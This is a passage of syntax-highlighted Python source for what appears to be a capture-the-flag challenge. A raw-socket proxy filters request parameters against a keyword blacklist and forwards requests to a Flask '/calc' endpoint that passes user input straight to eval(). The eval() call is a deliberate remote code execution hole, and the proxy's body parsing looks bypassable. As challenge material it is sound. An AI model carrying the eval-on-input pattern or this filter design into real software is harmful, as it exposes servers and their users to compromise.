</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">code</span> <span class="o">==</span> <span class="mh">0xFF02</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">code</span> <span class="o">==</span> <span class="mh">0xFF07</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_headers</span><span class="p">(</span><span class="n">headers</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">header_dict</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;:&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">header_dict</span><span class="p">[</span><span class="n">key</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()]</span> <span class="o">=</span> <span class="n">value</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">header_dict</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_params_for_secret</span><span class="p">(</span><span class="n">params</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">values</span> <span class="ow">in</span> <span class="n">params</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">values</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">value_normalized</span> <span class="o">=</span> <span class="n">to_halfwidth</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">keyword</span> <span class="ow">in</span> <span class="n">BLACKLIST_KEYWORDS</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">keyword</span> <span class="ow">in</span> <span class="n">value_normalized</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">handle_client</span><span class="p">(</span><span class="n">client_socket</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">TIMEOUT_SECONDS</span> <span class="o">=</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">client_socket</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="n">TIMEOUT_SECONDS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">request_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">header_end_idx</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">header_end_idx</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">chunk</span> <span class="o">=</span> <span class="n">client_socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">client_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span>
</span></span><span class="line"><span class="cl">            <span class="n">request_data</span> <span class="o">+=</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl">            <span class="n">header_end_idx</span> <span class="o">=</span> <span class="n">request_data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">header_end_idx</span> <span class="o">=</span> <span class="n">request_data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">header_end_idx</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;Malformed request&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">header_bytes</span> <span class="o">=</span> <span class="n">request_data</span><span class="p">[:</span><span class="n">header_end_idx</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">headers_raw</span> <span class="o">=</span> <span class="n">header_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">request_line</span> <span class="o">=</span> <span class="n">headers_raw</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">method</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">version</span> <span class="o">=</span> <span class="n">request_line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">maxsplit</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">client_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">headers</span> <span class="o">=</span> <span class="n">parse_headers</span><span class="p">(</span><span class="n">headers_raw</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl">        <span class="n">url_parts</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">query_params</span> <span class="o">=</span> <span class="n">parse_qs</span><span class="p">(</span><span class="n">url_parts</span><span class="o">.</span><span class="n">query</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">has_secret</span> <span class="o">=</span> <span class="n">check_params_for_secret</span><span class="p">(</span><span class="n">query_params</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">method</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">content_length</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;content-length&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">transfer_encoding</span> <span class="o">=</span> <span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;transfer-encoding&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">body_start</span> <span class="o">=</span> <span class="n">header_end_idx</span> <span class="o">+</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">            <span class="n">body_data</span> <span class="o">=</span> <span class="n">request_data</span><span class="p">[</span><span class="n">body_start</span><span class="p">:]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">request_data</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">body_start</span> <span class="k">else</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">transfer_encoding</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">body_buffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="n">remaining_data</span> <span class="o">=</span> <span class="n">body_data</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">remaining_data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">more</span> <span class="o">=</span> <span class="n">client_socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="ow">not</span> <span class="n">more</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="k">break</span>
</span></span><span class="line"><span class="cl">                        <span class="n">remaining_data</span> <span class="o">+=</span> <span class="n">more</span>
</span></span><span class="line"><span class="cl">                        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="n">size_line</span><span class="p">,</span> <span class="n">rest</span> <span class="o">=</span> <span class="n">remaining_data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">chunk_size</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">size_line</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">chunk_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">rest</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                            <span class="k">break</span>
</span></span><span class="line"><span class="cl">                        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">rest</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                                <span class="n">more</span> <span class="o">=</span> <span class="n">client_socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                <span class="k">if</span> <span class="ow">not</span> <span class="n">more</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                                    <span class="k">break</span>
</span></span><span class="line"><span class="cl">                                <span class="n">rest</span> <span class="o">+=</span> <span class="n">more</span>
</span></span><span class="line"><span class="cl">                            <span class="k">if</span> <span class="n">rest</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                                <span class="k">break</span>
</span></span><span class="line"><span class="cl">                            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                                <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="n">needed</span> <span class="o">=</span> <span class="n">chunk_size</span> <span class="o">+</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">                    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">rest</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">needed</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">more</span> <span class="o">=</span> <span class="n">client_socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">min</span><span class="p">(</span><span class="mi">4096</span><span class="p">,</span> <span class="n">needed</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rest</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="ow">not</span> <span class="n">more</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="k">break</span>
</span></span><span class="line"><span class="cl">                        <span class="n">rest</span> <span class="o">+=</span> <span class="n">more</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="n">chunk_data</span> <span class="o">=</span> <span class="n">rest</span><span class="p">[:</span><span class="n">chunk_size</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                    <span class="n">body_buffer</span> <span class="o">+=</span> <span class="n">chunk_data</span>
</span></span><span class="line"><span class="cl">                    <span class="n">remaining_data</span> <span class="o">=</span> <span class="n">rest</span><span class="p">[</span><span class="n">chunk_size</span> <span class="o">+</span> <span class="mi">2</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">body_str</span> <span class="o">=</span> <span class="n">body_buffer</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">post_params</span> <span class="o">=</span> <span class="n">parse_qs</span><span class="p">(</span><span class="n">body_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">has_secret</span> <span class="o">=</span> <span class="n">has_secret</span> <span class="ow">or</span> <span class="n">check_params_for_secret</span><span class="p">(</span><span class="n">post_params</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">content_length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">body_data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">content_length</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">chunk</span> <span class="o">=</span> <span class="n">client_socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">min</span><span class="p">(</span><span class="mi">4096</span><span class="p">,</span> <span class="n">content_length</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">body_data</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span>
</span></span><span class="line"><span class="cl">                    <span class="n">body_data</span> <span class="o">+=</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">body_str</span> <span class="o">=</span> <span class="n">body_data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="n">post_params</span> <span class="o">=</span> <span class="n">parse_qs</span><span class="p">(</span><span class="n">body_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="n">has_secret</span> <span class="o">=</span> <span class="n">has_secret</span> <span class="ow">or</span> <span class="n">check_params_for_secret</span><span class="p">(</span><span class="n">post_params</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">has_secret</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;HTTP/1.1 403 Forbidden</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;Content-Type: text/plain</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;Connection: close</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;We are all just trying our best to live&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">client_socket</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="n">client_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">backend_socket</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">backend_socket</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="n">TIMEOUT_SECONDS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">backend_socket</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">3001</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">backend_socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">request_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">response_chunk</span> <span class="o">=</span> <span class="n">backend_socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="ow">not</span> <span class="n">response_chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
</span></span><span class="line"><span class="cl">                <span class="n">client_socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">response_chunk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">backend_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;HTTP/1.1 504 Gateway Timeout</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;Content-Type: text/plain</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;Connection: close</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;Did not respond in time&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">client_socket</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="n">client_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">client_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;HTTP/1.1 408 Request Timeout</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;Content-Type: text/plain</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;Connection: close</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;timeout&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">client_socket</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl">        <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">client_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">client_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">start_flask_server</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/calc&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">exp</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;calc&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="n">exp</span><span class="o">!=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;no num to calc&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;I&#39;m just a calc, I could not process this&#34;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="kn">import</span> <span class="nn">logging</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="s1">&#39;werkzeug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">ERROR</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">3001</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">flask_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">start_flask_server</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">flask_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">proxy_socket</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
